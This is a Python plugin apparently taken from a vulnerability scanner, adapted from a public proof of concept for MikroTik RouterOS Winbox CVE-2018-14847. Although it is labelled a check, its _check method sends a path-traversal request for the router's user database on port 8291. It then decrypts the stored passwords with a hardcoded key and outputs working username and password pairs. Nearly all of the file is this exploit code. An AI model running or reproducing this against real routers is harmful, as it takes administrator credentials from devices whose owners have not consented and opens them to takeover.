#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Reference: https://github.com/BasuCert/WinboxPoC

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'winbox_cve_2018_14847'
        self.info = "Check the MikroTik RouterOS Winbox read/write arbitrary file Vuln CVE-2018-14847"
        self.keyword = ['all', 'winbox', 'mikrotik', 'cve_2018_14847', 'danger', '8291', 'intranet']
        self.default_ports_list = [8291]
        VulnCheck.__init__(self, ip_and_port_list)

    def decrypt_password(self, user, pass_enc):
        try:
            key = hashlib.md5(user + b"283i4jfkai3389").digest()
            passw = ""
            for i in range(0, len(pass_enc)):
                passw += chr(pass_enc[i] ^ ord(key[i % len(key)])) # add ord() in python2
            return passw.split("\x00")[0]
        except:
            return

    def extract_user_pass_from_entry(self, entry):
        try:
            user_data = entry.split(b"\x01\x00\x00\x21")[1]
            pass_data = entry.split(b"\x11\x00\x00\x21")[1]

            user_len = user_data[0]
            pass_len = pass_data[0]

            username = user_data[1:1 + user_len]
            password = pass_data[1:1 + pass_len]

            return username, password
        except:
            return

    def get_pair(self, data):
        user_list = []
        try:
            entries = data.split(b"M2")[1:]
            for entry in entries:
                try:
                    user, pass_encrypted = self.extract_user_pass_from_entry(entry)
                except:
                    continue

                pass_plain = self.decrypt_password(user, pass_encrypted)
                user  = user.decode("ascii")

                user_list.append((user, pass_plain))
        except:
            pass
        return user_list

    def _check(self, ip, port):
        a = [
                0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
                0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
                0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
                0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
                0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
                0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
                0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
                0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
                0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
                0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
                0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
                0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
                0x00, 0x00
            ]
        b = [
                0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
                0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
                0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
                0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
                0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
                0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
                0x00, 0x02, 0x00, 0x00, 0x00
            ]
        try:
            s = socket.socket()
            s.settimeout(timeout)
            s.connect((ip, port))
        except: 
            return

        try:
            a = bytearray(a)
            b = bytearray(b)

            s.send(a)
            d = bytearray(s.recv(1024))

            b[19] = d[38]

            s.send(b)
            d = bytearray(s.recv(1024))
            result_user_pwd = []
            user_pass = self.get_pair(d[55:])
            for u, p in user_pass:
                result_user_pwd.append('%s:%s'%(u, p))

            if len(result_user_pwd) > 0:
                result = 'the MikroTik RouterOS Winbox read/write arbitrary file Vuln CVE-2018-14847, %s'%(str(result_user_pwd))
                self._output(ip, port, result)
                return
        except:
            return

globals()['VulnChecker'] = VulnChecker